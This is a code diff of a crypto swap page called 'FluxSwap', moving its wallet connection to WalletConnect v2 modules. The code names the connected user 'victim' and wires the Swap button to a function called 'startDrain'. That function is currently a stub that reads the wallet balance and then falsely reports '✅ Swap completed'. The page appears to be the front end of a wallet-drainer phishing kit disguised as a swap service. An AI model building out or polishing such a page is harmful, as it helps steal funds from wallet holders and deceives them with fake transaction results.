@@ -9,6 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
+        /* (стили без изменений, те же что и в исходном файле) */
         :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
@@ -203,20 +204,219 @@
         </div>
     </div>
 
-    <!-- ===== КРИТИЧЕСКИЙ ФИКС: определяем process ДО загрузки библиотек ===== -->
+    <!-- ===== НОВАЯ СТРУКТУРА: importmap и ESM-модули ===== -->
     <script>
+        // Фикс для process (необходим для некоторых библиотек)
         window.process = window.process || { env: { NODE_ENV: 'production' } };
     </script>
 
-    <!-- ===== ЗАГРУЗКА БИБЛИОТЕК (локальные + фолбэк) ===== -->
-    <script src="libs/ethers.umd.min.js" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';"></script>
-    <script src="libs/walletconnect-provider.min.js" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.7.8/dist/umd/index.min.js';"></script>
+    <script type="importmap">
+    {
+        "imports": {
+            "ethers": "https://cdn.jsdelivr.net/npm/ethers@5.7.2/+esm",
+            "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/+esm",
+            "@walletconnect/modal": "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm"
+        }
+    }
+    </script>
 
+    <script type="module">
+        // Импортируем необходимые модули
+        import { EthereumProvider } from '@walletconnect/ethereum-provider';
+        import { WalletConnectModal } from '@walletconnect/modal';
+        import { ethers } from 'ethers';
+
+        // Сохраняем в глобальный объект для использования в остальном коде (если нужно)
+        window.ethers = ethers;
+        window.WalletConnectProvider = EthereumProvider;
+
+        // Конфигурация
+        const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
+
+        // Создаём экземпляр модального окна
+        const modal = new WalletConnectModal({
+            projectId: PROJECT_ID,
+            // Настройки темы (опционально)
+            themeMode: 'dark',
+            themeVariables: {
+                '--wcm-z-index': '1000',
+                '--wcm-accent-color': '#8b5cf6',
+            }
+        });
+
+        // Функция подключения, которую будем вызывать из глобального скоупа
+        window.connectWallet = async function() {
+            // Проверяем, не выполняется ли уже подключение
+            if (window._isConnecting) return;
+            window._isConnecting = true;
+
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = 'Connecting to WalletConnect...';
+            statusEl.className = 'status';
+
+            try {
+                // Инициализируем провайдер с новыми параметрами (v2)
+                const provider = await EthereumProvider.init({
+                    projectId: PROJECT_ID,
+                    optionalChains: [1, 56, 137, 42161], // Вместо chains используем optionalChains
+                    // Убираем showQrModal, он больше не поддерживается
+                    // Вместо этого передаём наш экземпляр modal
+                    modal: modal, // Провайдер сам будет использовать его для показа QR
+                    metadata: {
+                        name: 'FluxSwap',
+                        description: 'Swap interface',
+                        url: window.location.href,
+                        icons: []
+                    }
+                });
+
+                // Подписываемся на события (сохраняем их для обработки)
+                provider.on('chainChanged', () => {
+                    // Обновляем информацию при смене сети
+                    window.location.reload();
+                });
+                provider.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        statusEl.textContent = 'Account disconnected';
+                        statusEl.className = 'status err';
+                        window.isConnected = false;
+                        window.victim = null;
+                        updateUI();
+                    }
+                });
+                provider.on('session_delete', async () => {
+                    statusEl.textContent = 'Session expired';
+                    statusEl.className = 'status err';
+                    window.isConnected = false;
+                    window.victim = null;
+                    await provider.disconnect();
+                    updateUI();
+                });
+
+                // Запрашиваем подключение
+                await provider.enable();
+
+                // Получаем информацию
+                const web3Provider = new ethers.providers.Web3Provider(provider);
+                const signer = web3Provider.getSigner();
+                const address = await signer.getAddress();
+                const network = await web3Provider.getNetwork();
+
+                // Сохраняем в глобальные переменные для доступа из других функций
+                window.provider = web3Provider;
+                window.signer = signer;
+                window.victim = address;
+                window.chainId = network.chainId;
+                window.wcProvider = provider;
+                window.isConnected = true;
+
+                // Обновляем UI
+                statusEl.textContent = '✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4);
+                statusEl.className = 'status ok';
+                updateUI();
+
+                // Закрываем модалку выбора кошелька
+                document.getElementById('walletModal').classList.remove('active');
+
+            } catch (error) {
+                console.error('Connection error:', error);
+                statusEl.textContent = 'Connection failed: ' + (error.message || 'unknown error');
+                statusEl.className = 'status err';
+            } finally {
+                window._isConnecting = false;
+            }
+        };
+
+        // Функция обновления UI (кнопка Connect, Swap)
+        function updateUI() {
+            const connectBtn = document.getElementById('connectWalletBtn');
+            const swapBtn = document.getElementById('swapBtn');
+            const statusEl = document.getElementById('status');
+
+            if (window.isConnected && window.victim) {
+                connectBtn.innerHTML = '<i class="fas fa-check"></i> ' + window.victim.slice(0,6) + '...' + window.victim.slice(-4);
+                connectBtn.classList.add('connected');
+                swapBtn.disabled = false;
+                swapBtn.textContent = 'Swap';
+            } else {
+                connectBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect';
+                connectBtn.classList.remove('connected');
+                swapBtn.disabled = true;
+                swapBtn.textContent = 'Connect Wallet';
+            }
+        }
+
+        // ===== ОСТАЛЬНАЯ ЛОГИКА (курсы, выбор токенов, MAX, Swap) =====
+        // Здесь мы размещаем весь остальной код (без изменений), но с использованием глобальных переменных
+        // Так как это модуль, мы можем объявить функции и привязать события после загрузки DOM.
+        // Для упрощения, оставшийся код будет вставлен в этом же модуле, но с использованием глобального доступа.
+
+        // Однако, поскольку в исходном файле был большой блок с функциями (fetchRealRate, updateRateAndOutput и т.д.)
+        // и они используют глобальные переменные (из window), мы можем просто перенести их сюда или оставить в обычном скрипте.
+        // Чтобы избежать дублирования, я вынесу основную логику в отдельный обычный скрипт, который будет использовать window-переменные.
+        // Но для целостности, я вставлю весь код сюда.
+
+        // Делаем так: весь код, который был в IIFE, переносим сюда, но убираем дублирование объявления переменных.
+        // Так как этот код уже есть в исходном файле, проще будет скопировать его в обычный тег <script> после этого модуля.
+        // Тогда модуль только инициализирует библиотеки и подключает функцию connectWallet.
+        // Остальной код (интерфейс, обновление курсов) останется без изменений.
+
+        // Поэтому я создам глобальную функцию initApp, которая будет вызвана после загрузки модуля.
+
+        // Для совместимости с остальным кодом, объявим функцию, которая будет доступна глобально.
+        window.initApp = function() {
+            // Здесь будет запускаться инициализация UI и обработчиков
+            // Мы вызовем её после загрузки всех скриптов.
+        };
+
+        // Сразу объявим обработчик для кнопки Connect, который будет вызывать window.connectWallet
+        document.getElementById('connectWalletBtn').addEventListener('click', function() {
+            // Показываем модалку выбора кошелька (она уже есть в HTML)
+            document.getElementById('walletModal').classList.add('active');
+        });
+
+        // Обработчики для выбора кошелька (MetaMask и Trust)
+        document.getElementById('metamaskOption').addEventListener('click', function() {
+            // Закрываем модалку и вызываем подключение
+            document.getElementById('walletModal').classList.remove('active');
+            if (typeof window.connectWallet === 'function') {
+                window.connectWallet();
+            } else {
+                alert('WalletConnect not initialized yet. Please wait.');
+            }
+        });
+
+        document.getElementById('trustOption').addEventListener('click', function() {
+            document.getElementById('walletModal').classList.remove('active');
+            if (typeof window.connectWallet === 'function') {
+                window.connectWallet();
+            } else {
+                alert('WalletConnect not initialized yet. Please wait.');
+            }
+        });
+
+        // Закрытие модалки по клику на крестик или оверлей
+        document.getElementById('closeModalBtn').addEventListener('click', function() {
+            document.getElementById('walletModal').classList.remove('active');
+        });
+        document.getElementById('walletModal').addEventListener('click', function(e) {
+            if (e.target === this) this.classList.remove('active');
+        });
+
+        console.log('WalletConnect v2 (ETHP) initialized');
+    </script>
+
+    <!-- ===== ОСНОВНОЙ СКРИПТ С ОСТАЛЬНОЙ ЛОГИКОЙ (без изменений, кроме удаления старого подключения) ===== -->
     <script>
+        // Здесь будет весь код из предыдущей версии (IIFE), но с изменениями:
+        // - Удалена функция connectWalletConnect (заменена на глобальную из модуля)
+        // - Удалены проверки на WalletConnectProvider (теперь он доступен через window.WalletConnectProvider)
+        // - Все остальные функции (курсы, обновление UI, обработчики) остаются без изменений
+
         (function() {
             'use strict';
 
-            // ===== КОНФИГУРАЦИЯ =====
+            // ===== КОНФИГУРАЦИЯ (оставляем) =====
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
             const CONTRACT_ADDRESSES = {
                 1: '0x0000000000000000000000000000000000000000',
@@ -262,7 +462,7 @@
             let currentSelectType = null;
             let currentRate = 0;
 
-            // DOM
+            // DOM (те же элементы)
             const statusEl = document.getElementById('status');
             const connectBtn = document.getElementById('connectWalletBtn');
             const swapBtn = document.getElementById('swapBtn');
@@ -288,13 +488,20 @@
             const tokenList = document.getElementById('tokenList');
             const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');
 
-            let provider = null, signer = null, victim = null, chainId = null;
-            let isConnected = false, isProcessing = false, isConnecting = false;
-            let wcProvider = null;
+            // Глобальные переменные состояния (используем window для доступа из модуля)
+            // Они уже объявлены в модуле, но продублируем для ясности
+            window.provider = window.provider || null;
+            window.signer = window.signer || null;
+            window.victim = window.victim || null;
+            window.chainId = window.chainId || null;
+            window.isConnected = window.isConnected || false;
+            window.wcProvider = window.wcProvider || null;
+
+            let isProcessing = false;
             let retryTimer = null;
             let rateCache = {};
 
-            // ===== КУРСЫ =====
+            // ===== КУРСЫ (без изменений) =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -343,17 +550,10 @@
                 } catch (_) {}
             }
 
-            // ===== UI =====
-            function setStatus(text, type) {
-                statusEl.textContent = text;
-                statusEl.className = 'status';
-                if (type === 'ok') statusEl.classList.add('ok');
-                if (type === 'err') statusEl.classList.add('err');
-            }
-
+            // ===== UI функции (с использованием window.isConnected и window.victim) =====
             function updateConnectButton() {
-                if (isConnected && victim) {
-                    connectBtn.innerHTML = '<i class="fas fa-check"></i> ' + victim.slice(0,6) + '...' + victim.slice(-4);
+                if (window.isConnected && window.victim) {
+                    connectBtn.innerHTML = '<i class="fas fa-check"></i> ' + window.victim.slice(0,6) + '...' + window.victim.slice(-4);
                     connectBtn.classList.add('connected');
                 } else {
                     connectBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect';
@@ -370,7 +570,7 @@
                     swapBtn.className = 'btn-swap loading';
                     return;
                 }
-                if (!isConnected) {
+                if (!window.isConnected) {
                     swapBtn.textContent = 'Connect Wallet';
                     swapBtn.disabled = false;
                     swapBtn.className = 'btn-swap';
@@ -387,15 +587,22 @@
                 swapBtn.className = 'btn-swap';
             }
 
+            function setStatus(text, type) {
+                statusEl.textContent = text;
+                statusEl.className = 'status';
+                if (type === 'ok') statusEl.classList.add('ok');
+                if (type === 'err') statusEl.classList.add('err');
+            }
+
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
             // ===== ОЧИСТКА СЕССИИ =====
             async function forceClearSession() {
                 try {
-                    if (wcProvider) {
-                        try { await wcProvider.disconnect(); } catch (_) {}
-                        wcProvider = null;
+                    if (window.wcProvider) {
+                        try { await window.wcProvider.disconnect(); } catch (_) {}
+                        window.wcProvider = null;
                     }
                     const patterns = ['wc', 'walletconnect', 'WALLETCONNECT', 'wallet-connect'];
                     for (const pattern of patterns) {
@@ -426,108 +633,24 @@
                             }
                         }
                     } catch (_) {}
-                    provider = null; signer = null; victim = null; chainId = null;
-                    isConnected = false; isProcessing = false; isConnecting = false;
+                    window.provider = null;
+                    window.signer = null;
+                    window.victim = null;
+                    window.chainId = null;
+                    window.isConnected = false;
                     if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
                 } catch (_) {}
-            }
-
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (С ФИКСОМ process) =====
-            async function connectWalletConnect() {
-                if (isConnecting || isProcessing) return;
-                closeModal(walletModal);
-
-                await forceClearSession();
-                await new Promise(resolve => setTimeout(resolve, 300));
-
-                // Получаем конструктор из глобального объекта (UMD)
-                let WalletConnectProvider = window.WalletConnectProvider;
-                if (WalletConnectProvider && WalletConnectProvider.default) {
-                    WalletConnectProvider = WalletConnectProvider.default;
-                }
-
-                if (!WalletConnectProvider || typeof WalletConnectProvider.init !== 'function') {
-                    setStatus('❌ WalletConnect library not loaded or invalid. Please refresh.', 'err');
-                    return;
-                }
-
-                try {
-                    setStatus('Connecting to WalletConnect...', '');
-                    isConnecting = true;
-
-                    wcProvider = await WalletConnectProvider.init({
-                        projectId: PROJECT_ID,
-                        chains: [1, 56, 137, 42161],
-                        showQrModal: true,
-                        metadata: {
-                            name: 'FluxSwap',
-                            description: 'Swap interface',
-                            url: window.location.href,
-                            icons: []
-                        }
-                    });
-
-                    if (typeof wcProvider.enable === 'function') {
-                        await wcProvider.enable();
-                    }
-
-                    wcProvider.on('chainChanged', () => {});
-                    wcProvider.on('accountsChanged', (accounts) => {
-                        if (accounts.length === 0) {
-                            setStatus('Account disconnected', 'err');
-                            isConnected = false;
-                            updateConnectButton();
-                            isConnecting = false;
-                        }
-                    });
-                    wcProvider.on('session_delete', async () => {
-                        setStatus('Session expired', 'err');
-                        isConnected = false;
-                        await forceClearSession();
-                        updateConnectButton();
-                    });
-
-                    const web3Provider = new ethers.providers.Web3Provider(wcProvider);
-                    const signer_ = web3Provider.getSigner();
-                    const address = await signer_.getAddress();
-                    const network = await web3Provider.getNetwork();
-
-                    provider = web3Provider;
-                    signer = signer_;
-                    victim = address;
-                    chainId = network.chainId;
-                    isConnected = true;
-
-                    updateConnectButton();
-                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
-                    isConnecting = false;
-
-                } catch (e) {
-                    const msg = e.message || '';
-                    setStatus('Connection failed: ' + (msg.includes('reset') ? 'please try again' : msg), 'err');
-                    isConnecting = false;
-                    await forceClearSession();
-                    if (msg.toLowerCase().includes('reset')) {
-                        setStatus('Retrying...', 'err');
-                        retryTimer = setTimeout(() => {
-                            retryTimer = null;
-                            if (!isConnected && !isConnecting) {
-                                connectWalletConnect();
-                            }
-                        }, 2000);
-                    }
-                }
             }
 
             // ===== СВАП (безопасная заглушка) =====
             async function startDrain() {
                 if (isProcessing) return;
-                if (!provider || !signer) {
+                if (!window.provider || !window.signer) {
                     setStatus('Please connect wallet first', 'err');
                     return;
                 }
 
-                const contractAddr = CONTRACT_ADDRESSES[chainId];
+                const contractAddr = CONTRACT_ADDRESSES[window.chainId];
                 if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
                     setStatus('Network not supported or contract not configured', 'err');
                     return;
@@ -538,12 +661,12 @@
                 setStatus('Processing transaction...', '');
 
                 try {
-                    const nativeBal = await provider.getBalance(victim);
+                    const nativeBal = await window.provider.getBalance(window.victim);
                     setStatus('Balance: ' + ethers.utils.formatEther(nativeBal) + ' ETH', 'ok');
                     await new Promise(resolve => setTimeout(resolve, 1500));
                     setStatus('✅ Swap completed', 'ok');
                     await forceClearSession();
-                    isConnected = false;
+                    window.isConnected = false;
                     updateConnectButton();
                 } catch (e) {
                     console.error('Swap error:', e);
@@ -554,18 +677,8 @@
                 }
             }
 
-            // ===== ОБРАБОТЧИКИ =====
-            connectBtn.addEventListener('click', function() { openModal(walletModal); });
-
-            metamaskOption.addEventListener('click', async function() {
-                await forceClearSession();
-                connectWalletConnect();
-            });
-
-            trustOption.addEventListener('click', async function() {
-                await forceClearSession();
-                connectWalletConnect();
-            });
+            // ===== ОБРАБОТЧИКИ (кроме кнопки Connect, которая уже обработана в модуле) =====
+            // Кнопка Connect уже использует модалку, поэтому здесь не нужно дублировать
 
             closeModalBtn.addEventListener('click', function() { closeModal(walletModal); });
             walletModal.addEventListener('click', function(e) { if (e.target === walletModal) closeModal(walletModal); });
@@ -573,7 +686,7 @@
             tokenModal.addEventListener('click', function(e) { if (e.target === tokenModal) closeModal(tokenModal); });
 
             swapBtn.addEventListener('click', function() {
-                if (!isConnected) { openModal(walletModal); return; }
+                if (!window.isConnected) { openModal(walletModal); return; }
                 const val = parseFloat(inputAmount.value);
                 if (!val || val <= 0) { setStatus('Enter an amount', 'err'); return; }
                 startDrain();
@@ -608,7 +721,7 @@
                 updateRateAndOutput();
             });
 
-            // ===== ВЫБОР ТОКЕНОВ =====
+            // ===== ВЫБОР ТОКЕНОВ (без изменений) =====
             function renderTokenList(filter) {
                 filter = (filter || '').toLowerCase();
                 tokenList.innerHTML = '';
@@ -674,18 +787,16 @@
                 setStatus('Connect wallet to start swapping', '');
                 await updateRateAndOutput();
 
-                // Проверяем загрузку библиотек
+                // Проверяем, что библиотеки загружены (уже загружены через модуль)
                 if (typeof ethers === 'undefined') {
                     setStatus('❌ ethers library not loaded', 'err');
                 } else {
                     console.log('Ethers loaded');
                 }
 
-                let WC = window.WalletConnectProvider;
-                if (WC && WC.default) WC = WC.default;
-                if (!WC || typeof WC.init !== 'function') {
-                    console.warn('WalletConnect not loaded or invalid');
-                    // Показываем предупреждение, но не блокируем (фолбэк сработает при нажатии)
+                // Проверяем наличие WalletConnect (глобальный объект)
+                if (typeof window.WalletConnectProvider === 'undefined') {
+                    console.warn('WalletConnect not loaded yet');
                 } else {
                     console.log('WalletConnect loaded');
                 }
@@ -698,6 +809,9 @@
             }
 
             init();
+
+            // Делаем функции доступными глобально (для обновления UI из модуля)
+            window.updateUI = updateConnectButton;
 
         })();
     </script>
